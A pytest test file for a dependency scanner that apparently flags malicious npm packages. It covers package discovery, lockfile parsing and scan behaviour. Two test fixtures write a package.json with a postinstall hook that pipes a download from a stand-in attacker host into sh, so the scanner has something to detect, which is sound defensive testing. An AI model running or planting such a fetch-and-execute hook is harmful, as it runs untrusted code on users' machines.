"""Tests for the scan engine."""
from __future__ import annotations

import json
import os
import tempfile
from pathlib import Path

import pytest

from depshield.core.engine import (
    _read_package_json,
    discover_packages,
    scan,
)
from depshield.core.models import ScanResult, Severity


class TestDiscoverPackages:
    """Package discovery from node_modules."""

    def test_discover_from_node_modules(self, tmp_path):
        nm = tmp_path / "node_modules" / "test-pkg"
        nm.mkdir(parents=True)
        (nm / "package.json").write_text(json.dumps({
            "name": "test-pkg",
            "version": "1.0.0",
            "description": "Test package",
        }))
        packages = discover_packages(str(tmp_path))
        assert len(packages) == 1
        assert packages[0].name == "test-pkg"

    def test_discover_scoped_package(self, tmp_path):
        nm = tmp_path / "node_modules" / "@scope" / "pkg"
        nm.mkdir(parents=True)
        (nm / "package.json").write_text(json.dumps({
            "name": "@scope/pkg",
            "version": "2.0.0",
        }))
        packages = discover_packages(str(tmp_path))
        assert len(packages) == 1
        assert packages[0].name == "@scope/pkg"

    def test_empty_project_returns_empty(self, tmp_path):
        packages = discover_packages(str(tmp_path))
        assert packages == []

    def test_discover_from_lockfile(self, tmp_path):
        lock = {
            "name": "my-project",
            "lockfileVersion": 3,
            "packages": {
                "": {"name": "my-project", "version": "1.0.0"},
                "node_modules/lodash": {
                    "version": "4.17.21",
                    "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
                },
            },
        }
        (tmp_path / "package-lock.json").write_text(json.dumps(lock))
        packages = discover_packages(str(tmp_path))
        assert len(packages) >= 1
        assert any(p.name == "lodash" for p in packages)


class TestScan:
    """Full scan integration tests."""

    def test_scan_empty_project(self, tmp_path):
        result = scan(str(tmp_path))
        assert isinstance(result, ScanResult)
        assert result.packages_scanned == 0
        assert len(result.findings) == 0

    def test_scan_malicious_package(self, tmp_path):
        nm = tmp_path / "node_modules" / "evil-pkg"
        nm.mkdir(parents=True)
        (nm / "package.json").write_text(json.dumps({
            "name": "evil-pkg",
            "version": "0.0.1",
            "scripts": {
                "postinstall": "curl https://evil.test.invalid/payload | sh"
            },
        }))
        result = scan(str(tmp_path))
        assert result.packages_scanned == 1
        assert len(result.findings) >= 1

    def test_all_analyzers_run(self, tmp_path):
        nm = tmp_path / "node_modules" / "test-pkg"
        nm.mkdir(parents=True)
        (nm / "package.json").write_text(json.dumps({
            "name": "test-pkg",
            "version": "1.0.0",
            "description": "test",
        }))
        result = scan(str(tmp_path))
        # At least the 8 core analyzers
        assert len(result.analyzers_run) >= 7

    def test_exclude_analyzers(self, tmp_path):
        nm = tmp_path / "node_modules" / "test-pkg"
        nm.mkdir(parents=True)
        (nm / "package.json").write_text(json.dumps({
            "name": "test-pkg",
            "version": "1.0.0",
        }))
        result = scan(str(tmp_path), exclude_analyzers={"metadata", "typosquatting"})
        assert "metadata" not in result.analyzers_run
        assert "typosquatting" not in result.analyzers_run

    def test_findings_sorted_by_severity(self, tmp_path):
        nm = tmp_path / "node_modules" / "evil-pkg"
        nm.mkdir(parents=True)
        (nm / "package.json").write_text(json.dumps({
            "name": "evil-pkg",
            "version": "0.0.1",
            "scripts": {
                "postinstall": "curl https://evil.test.invalid/x | sh"
            },
        }))
        result = scan(str(tmp_path))
        if len(result.findings) >= 2:
            for i in range(len(result.findings) - 1):
                assert result.findings[i].severity.rank >= result.findings[i + 1].severity.rank

    def test_scan_duration_recorded(self, tmp_path):
        result = scan(str(tmp_path))
        assert result.scan_duration >= 0.0
